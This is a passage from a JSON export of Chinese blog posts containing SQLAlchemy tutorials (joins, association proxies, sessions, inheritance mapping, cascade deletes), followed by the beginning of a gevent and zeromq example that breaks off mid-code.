#新条目已经存在了\n#MappedProduct使用__getattr__将无法识别的属性和访问方法转发到它的query属性,它还提供了一些数据处理功能用于更新</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy import or_, and_, desc\n&gt;&gt;&gt; where = or_(db.product.sku=='123', db.product.sku=='111')\n&gt;&gt;&gt; db.product.filter(where).order_by(desc(db.product.msrp)).all() #这样使用多条件过滤,降序排练\n[MappedProduct(sku='111',msrp=22.44), MappedProduct(sku=u'123',msrp=Decimal('12.3400000000'))]</p>\n\n<p>&gt;&gt;&gt; join1 = db.join(db.product, db.product_price, isouter=True) #关联2个表, isouter=True确保LEFT OUTER(还没理解)\n&gt;&gt;&gt; join1.all()\n[MappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),sku2=u'123',store_id=1,price=Decimal('0E-10')),  #这个字段包含了2个表的相应字段\nMappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),sku2=u'123',store_id=2,price=Decimal('0E-10')), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),sku2=u'456',store_id=1,price=Decimal('0E-10')), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),sku2=u'456',store_id=2,price=Decimal('0E-10')), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),sku2=u'789',store_id=1,price=Decimal('0E-10')), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),sku2=u'789',store_id=2,price=Decimal('0E-10')), MappedJoin(sku=u'111',msrp=Decimal('22.4400000000'),sku2=None,store_id=None,price=None)]\n&gt;&gt;&gt; join2 = db.join(join1, db.store, isouter=True) #将store表也关联进来(因为也有一个外键),就是关联三个表\n&gt;&gt;&gt; join2.all()\n[MappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),sku2=u'123',store_id=1,price=Decimal('0E-10'),id=1,name=u'Main Store'), MappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),sku2=u'123',store_id=2,price=Decimal('0E-10'),id=2,name=u'Secondary Store'), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),sku2=u'456',store_id=1,price=Decimal('0E-10'),id=1,name=u'Main Store'), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),sku2=u'456',store_id=2,price=Decimal('0E-10'),id=2,name=u'Secondary Store'), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),sku2=u'789',store_id=1,price=Decimal('0E-10'),id=1,name=u'Main Store'), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),sku2=u'789',store_id=2,price=Decimal('0E-10'),id=2,name=u'Secondary Store'), MappedJoin(sku=u'111',msrp=Decimal('22.4400000000'),sku2=None,store_id=None,price=None,id=None,name=None)]\n&gt;&gt;&gt; join3 = db.with_labels(join1) #根据原籍标记,比如sku会说出:product_sku,告诉你它来着product表,但是指定了jion1,就不会标识关于store的表\n&gt;&gt;&gt; join3.first()\nMappedJoin(product_sku=u'123',product_msrp=Decimal('12.3400000000'),product_price_sku2=u'123',product_price_store_id=1,product_price_price=Decimal('0E-10'))\n&gt;&gt;&gt; db.with_labels(join2).first()\nMappedJoin(product_sku=u'123',product_msrp=Decimal('12.3400000000'),product_price_sku2=u'123',product_price_store_id=1,product_price_price=Decimal('0E-10'),store_id=1,store_name=u'Main Store')\n&gt;&gt;&gt; labelled_product = db.with_labels(db.product)\n&gt;&gt;&gt; join4 = db.join(labelled_product, db.product_price,  isouter=True)\n&gt;&gt;&gt; join4.first()\nMappedJoin(product_sku=u'123',product_msrp=Decimal('12.3400000000'),sku2=u'123',store_id=1,price=Decimal('0E-10'))</p>\n\n<p>&gt;&gt;&gt; db.clear()\n&gt;&gt;&gt; join5 = db.join(db.product, db.product_price)\n&gt;&gt;&gt; s = select([db.product._table,\n...     func.avg(join5.c.price).label('avg_price')], #添加一个字段计算产品(product)的price平均值,字段名为avg_price\n...     from_obj=[join5._table],\n...     group_by=[join5.c.sku])\n&gt;&gt;&gt; s = s.alias('products_with_avg_price') #它是from sqlalchemy import alias; a = alias(self, name=name)的简写\n&gt;&gt;&gt; products_with_avg_price = db.map(s, primary_key=[join5.c.sku]) #因为没有映射到表或者join，需要指定如何找到主键\n&gt;&gt;&gt; products_with_avg_price.all()\n[MappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),avg_price=0.0), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),avg_price=0.0), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),avg_price=0.0)]\n&gt;&gt;&gt; db.product_price.first().price = 50.00\n&gt;&gt;&gt; db.flush()\n&gt;&gt;&gt; products_with_avg_price.all()\n[MappedJoin(sku=u'123',msrp=Decimal('12.3400000000'),avg_price=0.0), MappedJoin(sku=u'456',msrp=Decimal('22.1200000000'),avg_price=0.0), MappedJoin(sku=u'789',msrp=Decimal('41.4400000000'),avg_price=0.0)]\n&gt;&gt;&gt; db.products_with_avg_price = products_with_avg_price #保存映射到db,方便重用\n&gt;&gt;&gt; msrp=select([db.product.c.msrp],\n...     db.product.sku==db.product_price.sku2) #获取sku和sku2相等时候msrp的值\n&gt;&gt;&gt; db.product_price.update(  #更新数据\n...     values=dict(price=msrp),synchronize_session=False) #设置price这个字段值为上面对应的msrp</p>\n\n<p>6\n&gt;&gt;&gt; db.product_price.all()\n[MappedProduct_price(sku2=u'123',store_id=1,price=Decimal('12.3400000000')), MappedProduct_price(sku2=u'456',store_id=1,price=Decimal('22.1200000000')), MappedProduct_price(sku2=u'789',store_id=1,price=Decimal('41.4400000000')), MappedProduct_price(sku2=u'123',store_id=2,price=Decimal('12.3400000000')), MappedProduct_price(sku2=u'456',store_id=2,price=Decimal('22.1200000000')), MappedProduct_price(sku2=u'789',store_id=2,price=Decimal('41.4400000000'))]</p>\n\n<p><strong>3 associationproxy</strong></p>\n\n<p>associationproxy用于创建一个读/写整个关系的目标属性</p>\n\n<p>看一个例子就懂了:</p>\n\n<p>&gt;&gt;&gt; user_table = Table(\n...     'user', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('user_name', String(255), unique=True),\n...     Column('password', String(255)))\n&gt;&gt;&gt; brand_table = Table(\n...     'brand', metadata,\n...     Column('id', Integer, primary_key=True),\n...     Column('name', String(255)))\n&gt;&gt;&gt; sales_rep_table = Table(\n...     'sales_rep', metadata,\n... Column('brand_id', None, ForeignKey('brand.id'), primary_key=True),\n... Column('user_id', None, ForeignKey('user.id'), primary_key=True),\n...     Column('commission_pct', Integer, default=0))\n&gt;&gt;&gt; class User(object): pass\n...\n&gt;&gt;&gt; class Brand(object): pass\n...\n&gt;&gt;&gt; class SalesRep(object): pass\n...\n&gt;&gt;&gt; mapper(User, user_table, properties=dict(\n...     sales_rep=relation(SalesRep, backref='user', uselist=False)))\n&lt;Mapper at 0x87472ec; User&gt;\n&gt;&gt;&gt; mapper(Brand, brand_table, properties=dict(\n...     sales_reps=relation(SalesRep, backref='brand')))\n&lt;Mapper at 0x874770c; Brand&gt;\n&gt;&gt;&gt; mapper(SalesRep, sales_rep_table)\n&lt;Mapper at 0x874768c; SalesRep&gt;</p>\n\n<p>ORM完成,但是假如我们想要brand(品牌)类对象的一个所有SalesReps for Brand(品牌的销售代表)的User列表属性,可以这样:</p>\n\n<p>class Brand(object):\n@property\ndef users(self):\nreturn [ sr.user for sr in self.sales_reps ]</p>\n\n<p>但是不方便增加删除,而使用association_proxy:</p>\n\n<p>&gt;&gt;&gt; from sqlalchemy.ext.associationproxy import association_proxy\n&gt;&gt;&gt; class Brand(object):\n...         users=association_proxy('sales_reps', 'user')\n...</p>\n\n<p>或者:</p>\n\n<p>mapper(Brand, brand_table, properties=dict(\nsales_reps=relation(SalesRep, backref='brand')))\nBrand.users=association_proxy('sales_reps', 'user')#优点是维持了域对象</p>\n\n<p>我们需要修改类,增加属性:</p>\n\n<p>class User(object):\ndef __init__(self, user_name=None, password=None):\nself.user_name=user_name\nself.password=password</p>\n\n<p>class Brand(object):\ndef __init__(self, name=None):\nself.name = name</p>\n\n<p>class SalesRep(object):\ndef __init__(self, user=None, brand=None, commission_pct=0):\nself.user = user\nself.brand = brand\nself.commission_pct=commission_pct</p>\n\n<p>看下面的效果:</p>\n\n<p>&gt;&gt;&gt; b = Brand('Cool Clothing')\n&gt;&gt;&gt; session.add(b)\n&gt;&gt;&gt; u = User('rick', 'foo')\n&gt;&gt;&gt; session.add(u)\n&gt;&gt;&gt; session.flush()\n2012-07-20 12:22:33,191 INFO sqlalchemy.engine.base.Engine INSERT INTO user (user_name, password) VALUES (?, ?)\n2012-07-20 12:22:33,191 INFO sqlalchemy.engine.base.Engine ('rick', 'foo')\n2012-07-20 12:22:33,191 INFO sqlalchemy.engine.base.Engine INSERT INTO brand (name) VALUES (?)\n2012-07-20 12:22:33,191 INFO sqlalchemy.engine.base.Engine ('Cool Clothing',)\n&gt;&gt;&gt; b.users\n2012-07-20 12:22:42,135 INFO sqlalchemy.engine.base.Engine SELECT sales_rep.brand_id AS sales_rep_brand_id, sales_rep.user_id AS sales_rep_user_id, sales_rep.commission_pct AS sales_rep_commission_pct\nFROM sales_rep\nWHERE ? = sales_rep.brand_id\n2012-07-20 12:22:42,135 INFO sqlalchemy.engine.base.Engine (2,)\n[]\n&gt;&gt;&gt; b.users.append(u) #自动创建一个单一的位置参数调用其中介(SalesRep)对象\n2012-07-20 12:22:46,782 INFO sqlalchemy.engine.base.Engine SELECT sales_rep.brand_id AS sales_rep_brand_id, sales_rep.user_id AS sales_rep_user_id, sales_rep.commission_pct AS sales_rep_commission_pct\nFROM sales_rep\nWHERE ? = sales_rep.user_id\n2012-07-20 12:22:46,782 INFO sqlalchemy.engine.base.Engine (2,)\n&gt;&gt;&gt; b.users\n[&lt;__main__.User object at 0x87d7b6c&gt;]\n&gt;&gt;&gt; b.sales_reps\n[&lt;__main__.SalesRep object at 0x87d7c4c&gt;]\n&gt;&gt;&gt; b.sales_reps[0].commission_pct\n0\n&gt;&gt;&gt; session.flush()\n2012-07-20 12:23:14,215 INFO sqlalchemy.engine.base.Engine INSERT INTO sales_rep (brand_id, user_id, commission_pct) VALUES (?, ?, ?)\n2012-07-20 12:23:14,215 INFO sqlalchemy.engine.base.Engine (2, 2, 0)</p>\n\n<p>更复杂的想法给销售人员一个10%的提成:</p>\n\n<p>Brand.users=association_proxy(\n'sales_reps', 'user',\ncreator=lambda u:SalesRep(user=u, commission_pct=10))</p>\n\n<p>假设我们想要的品牌属性是一个附带User和佣金commission_pct的字典:</p>\n\n<p>from sqlalchemy.orm.collections import attribute_mapped_collection\n&gt;&gt;&gt; from sqlalchemy.orm.collections import attribute_mapped_collection\n&gt;&gt;&gt; reps_by_user_class=attribute_mapped_collection('user')\n&gt;&gt;&gt; clear_mappers()\n&gt;&gt;&gt; mapper(Brand, brand_table, properties=dict(\n...     sales_reps_by_user=relation(\n...         SalesRep, backref='brand',\n...         collection_class=reps_by_user_class)))\n&lt;Mapper at 0x862c5ec; Brand&gt;</p>\n\n<p>&gt;&gt;&gt; Brand.commissions=association_proxy(\n...     'sales_reps_by_user', 'commission_pct',\n...     creator=lambda key,value: SalesRep(user=key, commission_pct=value))\n&gt;&gt;&gt; mapper(User, user_table, properties=dict(\n...     sales_rep=relation(SalesRep, backref='user', uselist=False)))\n&lt;Mapper at 0x8764b2c; User&gt;\n&gt;&gt;&gt; mapper(SalesRep, sales_rep_table)\n&lt;Mapper at 0x87bb4cc; SalesRep&gt;\n&gt;&gt;&gt; b = session.query(Brand).get(1)\n&gt;&gt;&gt; u = session.query(User).get(1)\n&gt;&gt;&gt; b.commissions[u] = 20\n&gt;&gt;&gt; session.bind.echo = False\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; b = session.query(Brand).get(1)\n&gt;&gt;&gt; u = session.query(User).get(1)\n&gt;&gt;&gt; u.user_name\nu'dongwm'\n&gt;&gt;&gt; print b.commissions[u]\n20\n&gt;&gt;&gt; print b.sales_reps_by_user[u] #代理和原来的关系是自动同步的\n&lt;__main__.SalesRep object at 0x87e3dcc&gt;\n&gt;&gt;&gt; print b.sales_reps_by_user[u].commission_pct\n20</p>\n\n<p>&nbsp;\n<div></div>\n&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "19"
    }
  },
  {
    "id": 243,
    "title": "SQLAlchemy教程(六)",
    "category": "linux基础",
    "tags": [
      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengliu/",
    "content": "<p><strong>本文主要是ORM的sission查询和更新</strong></p>\n\n<p>session负责执行内存中的对象和数据库表之间的同步工作,创建session可以这样:</p>\n\n<p>Session = sessionmaker(bind=engine) #sqlalchemy.orm.session.Session类有很多参数,使用sessionmaker是为了简化这个过程</p>\n\n<p>或者:\nSession = sessionmaker()\nSession.configure(bind=engine)</p>\n\n<p>注:sessionmaker的参数:\nautoflush=True  #为True时，session将在执行session的任何查询前自动调用flush()。这将确保返回的结果</p>\n\n<p>transactional=False #为True时，session将自动使用事务commit\ntwophase=False #当处理多个数据库实例,当使用flush()但是没有提交事务commit时,给每个数据库一个标识,使整个事务回滚</p>\n\n<p>创建session,添加数据的例子(以前也出现过很多次了)\ndongwm@localhost ~ $ python\nPython 2.7.3 (default, Jul 11 2012, 10:10:17)\n[GCC 4.5.3] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; from sqlalchemy import *\n&gt;&gt;&gt; from sqlalchemy.orm import *\n&gt;&gt;&gt; engine = create_engine('sqlite://')\n&gt;&gt;&gt; metadata = MetaData(engine)\n&gt;&gt;&gt; account_table = Table(\n... 'account', metadata,\n... Column('id', Integer, primary_key=True),\n... Column('balance', Numeric))\n&gt;&gt;&gt; class Account(object): pass\n...\n&gt;&gt;&gt; mapper(Account, account_table)\n&lt;Mapper at 0x84e6f2c; Account&gt;\n&gt;&gt;&gt; account_table.create()\n&gt;&gt;&gt; a = Account()\n&gt;&gt;&gt; a.balance = 100.00\n&gt;&gt;&gt; Session = sessionmaker(bind=engine)\n&gt;&gt;&gt; session = Session()\n&gt;&gt;&gt; session.add(a)\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; session.delete(a) #自动删除 account_table相应条目,但是在1:N和M:N关系中不会自动删除它的级联关系\n&gt;&gt;&gt; session.flush()</p>\n\n<p><strong>注:session的对象状态:</strong></p>\n\n<p>Transient:短暂的,主要指内存中的对象</p>\n\n<p>Pending:挂起的,这样的对象准备插入数据库,等执行了flush就会插入</p>\n\n<p>Persistent:持久的</p>\n\n<p>Detached:对象在数据库里面有记录,但是不属于session</p>\n\n<p>&gt;&gt;&gt; make_transient(a)  #因为标识了已删除,恢复a的状态\n&gt;&gt;&gt; session.add(a) #重新添加\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; query = session.query(Account)\n&gt;&gt;&gt; print query\nSELECT account.id AS account_id, account.balance AS account_balance\nFROM account\n&gt;&gt;&gt; for obj in query:\n...     print obj\n...\n&lt;__main__.Account object at 0x84eef0c&gt;</p>\n\n<p>&gt;&gt;&gt; query.all()  #查询所有\n[&lt;__main__.Account object at 0x84eef0c&gt;]\n&gt;&gt;&gt; query = query.filter(Account.balance &gt; 10.00)  #filter过滤\n&gt;&gt;&gt; for obj in query:\n...     print obj.balance\n...</p>\n\n<p>100.00</p>\n\n<p>&gt;&gt;&gt; for i in session.query(Account).filter_by(balance=100.00 ):  #通过条件过滤\n...     print i\n&gt;&gt;&gt; query = session.query(Account)\n&gt;&gt;&gt; query = query.from_statement('select *from account where balance=:bac') #通过带通配符的SQL语句其中:bac标识这个参数是bac\n&gt;&gt;&gt; query = query.params(bac='100.00') #根据bac指定值寻找\n&gt;&gt;&gt; print query.all()\n[&lt;__main__.Account object at 0x84eef0c&gt;]</p>\n\n<p><strong>本地session</strong></p>\n\n<p>&gt;&gt;&gt; Session = scoped_session(sessionmaker(  #设置一个本地的共享session\n...     bind=engine, autoflush=True))\n&gt;&gt;&gt; session = Session()\n&gt;&gt;&gt; session2 = Session()\n&gt;&gt;&gt; session is session2  #他们是同一个\nTrue</p>\n\n<p>&gt;&gt;&gt; a = Account()\n&gt;&gt;&gt; a.balance = 100.00\n&gt;&gt;&gt; Session.add(a) #注意 这是的'S'是大写\n&gt;&gt;&gt; Session.flush()\n&gt;&gt;&gt; b = Account()\n&gt;&gt;&gt; a.balance = 200.00\n&gt;&gt;&gt; session.add(a)  #其实他们是一个共享的session 名字都可以\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; print session.query(Account).all() #查询到了2个\n[&lt;__main__.Account object at 0x851be0c&gt;, &lt;__main__.Account object at 0x84f7d6c&gt;]</p>\n\n<p>注:这样的映射mapper也可以这样是用:</p>\n\n<p>mapper(Product, product_table, properties=dict(\ncategories=relation(Category, secondary=product_category_table,\nbackref='products')))</p>\n\n<p>Session.mapper(Product, product_table, properties=dict(\ncategories=relation(Category, secondary=product_category_table,\nbackref='products'))) #它的优点是可以初始化参数</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "19"
    }
  },
  {
    "id": 244,
    "title": "SQLAlchemy教程(七)",
    "category": "python",
    "tags": [

    ],
    "url": "/archives/sqlalchemyjiaochengqi/",
    "content": "<p><strong>本文主要是面向对象的继承映射到关系数据库表的方法</strong></p>\n\n<p>&gt;&gt;&gt; class Product(object):\n...     def __init__(self, sku, msrp):\n...         self.sku = sku\n...         self.msrp = msrp\n...     def __repr__(self):\n...         return '&lt;%s %s&gt;' % (\n...             self.__class__.__name__, self.sku)\n...\n&gt;&gt;&gt; class Clothing(Product):\n...     def __init__(self, sku, msrp, clothing_info):\n...         Product.__init__(self, sku, msrp) #继承了Product\n...         self.clothing_info = clothing_info\n...\n&gt;&gt;&gt; class Accessory(Product):\n...     def __init__(self, sku, msrp, accessory_info):\n...         Product.__init__(self, sku, msrp) #继承了Product\n...         self.accessory_info = accessory_info\n也就是这样的意思:</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-1.png\"><img class=\"alignnone  wp-image-1267\" title=\"Screenshot-1\" src=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-1.png\" alt=\"\" width=\"700\" height=\"251\" /></a></p>\n\n<p>这个单表继承中(如下图,黑色的表示没有被映射):</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-2.png\"><img class=\"alignnone  wp-image-1270\" title=\"Screenshot-2\" src=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-2.png\" alt=\"\" width=\"683\" height=\"316\" /></a></p>\n\n<p>从创建表结构是这样:</p>\n\n<p>&gt;&gt;&gt; product_table = Table(\n...     'product', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric),\n...     Column('clothing_info', String),\n...     Column('accessory_info', String),\n...     Column('product_type', String(1), nullable=False)) #一个新的字段\n&gt;&gt;&gt; mapper(\n...     Product, product_table,\n...     polymorphic_on=product_table.c.product_type, #映射继承层次结构使用polymorphic_on表示继承在product_type字段,值是polymorphic_identity指定的标识\n...     polymorphic_identity='P') #标识继承 Product ,父类\n&lt;Mapper at 0x85833ec; Product&gt;\n&gt;&gt;&gt; mapper(Clothing, inherits=Product,\n...        polymorphic_identity='C')   #标识继承Clothing product\n&lt;Mapper at 0x858362c; Clothing&gt;\n&gt;&gt;&gt;\n&gt;&gt;&gt; mapper(Accessory, inherits=Product, #继承至Product\n...        polymorphic_identity='A') #标识继承Accessory\n&lt;Mapper at 0x8587d8c; Accessory&gt;\n&gt;&gt;&gt; products = [  #创建一些产品\n...     Product('123', 11.22),\n...     Product('456', 33.44),\n...     Clothing('789', 123.45, \"Nice Pants\"),\n...     Clothing('111', 125.45, \"Nicer Pants\"),\n...     Accessory('222', 24.99, \"Wallet\"),\n...     Accessory('333', 14.99, \"Belt\") ]\n&gt;&gt;&gt; Session = sessionmaker()\n&gt;&gt;&gt; session = Session()\n&gt;&gt;&gt; for p in products:\n...     session.add(p)\n...\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; print session.query(Product).all() #全部都有\n[&lt;Product 123&gt;, &lt;Product 456&gt;, &lt;Clothing 789&gt;, &lt;Clothing 111&gt;, &lt;Accessory 222&gt;, &lt;Accessory 333&gt;]\n&gt;&gt;&gt; print session.query(Clothing).all()  #只显示2个\n[&lt;Clothing 789&gt;, &lt;Clothing 111&gt;]\n&gt;&gt;&gt; print session.query(Accessory).all() #只显示2个,是不是上面的映射效果和创建3个类而分别orm好的多呢?\n[&lt;Accessory 222&gt;, &lt;Accessory 333&gt;]</p>\n\n<p>&gt;&gt;&gt; for row in product_table.select().execute(): #从父类库查询,所有数据都有,只是product_type不同\n...     print row\n...\n(u'123', Decimal('11.2200000000'), None, None, u'P')\n(u'456', Decimal('33.4400000000'), None, None, u'P')\n(u'789', Decimal('123.4500000000'), u'Nice Pants', None, u'C')\n(u'111', Decimal('125.4500000000'), u'Nicer Pants', None, u'C')\n(u'222', Decimal('24.9900000000'), None, u'Wallet', u'A')\n(u'333', Decimal('14.9900000000'), None, u'Belt', u'A')</p>\n\n<p>具体的映射见下图:</p>\n\n<p><a href=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-3.png\"><img class=\"alignnone  wp-image-1271\" title=\"Screenshot-3\" src=\"http://www.dongwm.com/wp-content/uploads/2012/07/Screenshot-3.png\" alt=\"\" width=\"629\" height=\"232\" /></a></p>\n\n<p>查询一个没有的不存在的映射:</p>\n\n<p>&gt;&gt;&gt; print session.query(Accessory)[0].clothing_info\nNone</p>\n\n<p><strong>具体表的继承</strong></p>\n\n<p><strong></strong>每个表包含的数据量,需要实现它的类;没有浪费的空间</p>\n\n<p>&gt;&gt;&gt; metadata.remove(product_table)\n&gt;&gt;&gt; product_table = Table(\n...     'product', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric))\n&gt;&gt;&gt; clothing_table = Table(\n...     'clothing', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric),\n...     Column('clothing_info', String))\n&gt;&gt;&gt;\n&gt;&gt;&gt; accessory_table = Table(\n...     'accessory', metadata,\n...     Column('sku', String(20), primary_key=True),\n...     Column('msrp', Numeric),\n...     Column('accessory_info', String))\n&gt;&gt;&gt;\n摄像我们想要获取Product'sku'是222的数据(没有其他额外的工作),我们不得不层次型的查询每个类,请看这个例子:</p>\n\n<p>&gt;&gt;&gt; punion = polymorphic_union(\n...     dict(P=product_table,\n...     C=clothing_table,\n...     A=accessory_table),\n...     'type_')\n&gt;&gt;&gt;\n&gt;&gt;&gt; print punion\nSELECT accessory.sku, accessory.msrp, accessory.accessory_info, CAST(NULL AS VARCHAR) AS clothing_info, 'A' AS type_\nFROM accessory UNION ALL SELECT product.sku, product.msrp, CAST(NULL AS VARCHAR) AS accessory_info, CAST(NULL AS VARCHAR) AS clothing_info, 'P' AS type_\nFROM product UNION ALL SELECT clothing.sku, clothing.msrp, CAST(NULL AS VARCHAR) AS accessory_info, clothing.clothing_info, 'C' AS type_\nFROM clothing\n现在我们就有了一个很好的标记了(C,A,P)</p>\n\n<p>&gt;&gt;&gt; mapper(\n...     Product, product_table, with_polymorphic=('*', punion),  #使用with_polymorphic=('*', punion)的方式映射父类,指定不同表选择,实现多态,并且提高了性能(只select了一次)\n...     polymorphic_on=punion.c.type_,\n...     polymorphic_identity='P')\n&lt;Mapper at 0x8605b6c; Product&gt;\n&gt;&gt;&gt; mapper(Clothing, clothing_table, inherits=Product,\n... polymorphic_identity='C',\n... concrete=True)\n&lt;Mapper at 0x84f1bac; Clothing&gt;\n&gt;&gt;&gt; mapper(Accessory, accessory_table, inherits=Product,\n... polymorphic_identity='A',\n... concrete=True)\n&lt;Mapper at 0x858770c; Accessory&gt;</p>\n\n<p>&gt;&gt;&gt; session.query(Product).get('222')\n&lt;Accessory 222&gt;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "19"
    }
  },
  {
    "id": 245,
    "title": "SQLAlchemy教程(五)",
    "category": "linux基础",
    "tags": [
      "SQLAlchemy"
    ],
    "url": "/archives/sqlalchemyjiaochengwu/",
    "content": "<p><strong> 本文主要说删除</strong></p>\n\n<p>metadata.drop_all(engine) #删除某引擎的全部表</p>\n\n<p>metadata.remove(test_table)  #删除某一个table</p>\n\n<p>clear_mappers() #取消所有的映射</p>\n\n<p>在relation中有一个参数cascade,它是基于session的操作,包括把对象放入session,从session删除对象等,如果指定cascade=\"all\"表示做的任何session操作给映射类都能很好的工作,默认包含save-update, merge\nmapper(ParentClass, parent, properties=dict(\nchildren=relation(ChildClass, backref='parent',\ncascade='all,delete-orphan') )) #delete-orphan表示如果曾经是子类(childclass)实例但是却没有和父类连接的情况下,假如要删除这个子类,而不想挂空父类引用了的实例,\n额看个例子就懂了:\nphoto = Table(\n... 'photo', metadata,\n... Column('id', Integer, primary_key=True))\ntag = Table(\n... 'tag', metadata,\n... Column('id', Integer, primary_key=True),\n... Column('photo_id', None, ForeignKey('photo.id')),\n... Column('tag', String(80)))\nclass Photo(object):\n... pass\n...\nclass Tag(object):\n... def __init__(self, tag):\n... self.tag = tag\n...\nmapper(Photo, photo, properties=dict(\n... tags=relation(Tag, backref='photo', cascade=\"all\")))\n&lt;Mapper at 0x851504c; Photo&gt;\n&gt;&gt;&gt; mapper(Tag, tag)\n&lt;Mapper at 0x8515dac; Tag&gt;\n&gt;&gt;&gt; p1 = Photo()\n&gt;&gt;&gt; p2 = Photo()\n&gt;&gt;&gt; p1.tags = [Tag(tag='foo'),Tag(tag='bar'),Tag(tag='baz')]\n&gt;&gt;&gt; p2.tags = [Tag(tag='foo'),Tag(tag='bar'),Tag(tag='baz')]\n&gt;&gt;&gt; session.add(p1)\n&gt;&gt;&gt; session.add(p2)\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; for t in session.query(Tag):\n... print t.id,t.photo_id, t.tag\n...\n1 1 foo #出现以下关联数据\n2 1 bar\n3 1 baz\n4 2 foo\n5 2 bar\n6 2 baz\n&gt;&gt;&gt; session.delete(session.query(Photo).get(1)) #删除一个tag的数据\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; for t in session.query(Tag):\n... print t.id, t.photo_id, t.tag\n...\n4 2 foo #他会删除关联所有t.photo_id为1的数据,在这里relation(ChildClass, backref='parent', cascade='all,delete-orphan')<span class=\"fullpost\">指定delete-orphan</span>没什么,关键看下面\n5 2 bar\n6 2 baz\n&gt;&gt;&gt; p3 = session.query(Photo).get(2)\n&gt;&gt;&gt; del p3.tags[0] #如果我只是删除关联点...\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; for t in session.query(Tag):\n... print t.id, t.photo_id, t.tag\n...\n4 None foo #关联点photo_id成了none,但是条目存在 --他不会影响其它关联表\n5 2 bar\n6 2 baz</p>\n\n<p>&gt;&gt;&gt; p3 = session.query(Photo).get(2) #假如没有设置delete-orphan\n&gt;&gt;&gt; del p3.tags[0]\n&gt;&gt;&gt; session.flush()\n&gt;&gt;&gt; for t in session.query(Tag):\n... print t.id, t.photo_id, t.tag\n5 2 bar #自动删除了关联的其它表的项\n6 2 baz\n<strong>注:可用的cascade参数包含:</strong>\n<ul>\n\t<li><tt>save-update</tt> -我的理解是调用session.add()会自动将项目添加到相应级联关系上,也适用于已经从关系中删除的项目嗨没有来得及刷新的情况</li>\n\t<li><tt>merge</tt> - 它是session.merge的实现,复制状态到具有相同标识符的持久化实例的实例,如果没有持久的实例和当前session相关联，返回的持久化实例。如果给定的实例未保存，他会保存一个副本，并返回这个副本作为一个新的持久化实例</li>\n\t<li><tt>expunge</tt> - 从session中删除实例</li>\n\t<li><tt>delete</tt> - 标记一个实例被删除,执行flush()会执行删除操作</li>\n\t<li><tt>delete-orphan</tt>-如果子类从母类删除,标记之,但是不影响母类</li>\n\t<li><tt>refresh-expire</tt> - 定期刷新在给定的实例的属性,查询并刷新数据库</li>\n\t<li><tt>all</tt> - 以上全部属性的集合:“save-update,merge, refresh-expire, expunge, delete</li>\n</ul></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "19"
    }
  },
  {
    "id": 246,
    "title": "关于gevent的一些理解(二)",
    "category": "gevent",
    "tags": [
      "gevent"
    ],
    "url": "/archives/guanyugeventdeyixielijieer/",
    "content": "<p><strong>3 实际应用</strong></p>\n\n<p>1 zeromq和gevent:</p>\n\n<p>zeromq的介绍请参看:http://www.infoq.com/cn/news/2010/09/introduction-zero-mq</p>\n\n<p>假设你已经安装了zeromq,gevent_zeromq(https://github.com/traviscline/gevent-zeromq.git)和pyzmq</p>\n\n<p>一个很基础的例子:</p>\n\n<p><pre class=\"sh_python\">\nimport gevent\nfrom gevent_zeromq import zmq</p>\n\n<p># Global Context\ncontext = zmq.Context() #它是GreenContext的一个简写,确保greenlet化socket</p>\n\n<p>def server():\n    server_socket = context.socket(zmq.REQ) #创建一个socket,使用mq类型模式REQ/REP(请求/回复,服务器是请求),还有PUB/SUB(发布/订阅),push/pull等\n    server_socket.bind(\"tcp://127.0.0.1:5000\") #绑定socket</p>\n\n<p>    for request in range(1,10):\n        server_socket.send(\"Hello\")\n        print('Switched to Server for ', request)\n        server_socket.recv()  #这里发生上下文切换</p>\n\n<p>def client():\n    client_socket = context.socket(zmq.REP)  (客户端是回复)\n    client_socket.connect(\"tcp://127.0.0.1:5000\")  #连接server的socket端口</p>\n\n<p>    for request in range(1,10):</p>\n\n<p>        client_socket.recv()\n        print('Switched to Client for ', request)\n        client_socket.send(\"World\")</p>\n\n<p>publisher = gevent.spawn(server)\nclient    = gevent.spawn(client)</p>\n\n<p>gevent.joinall([publisher, 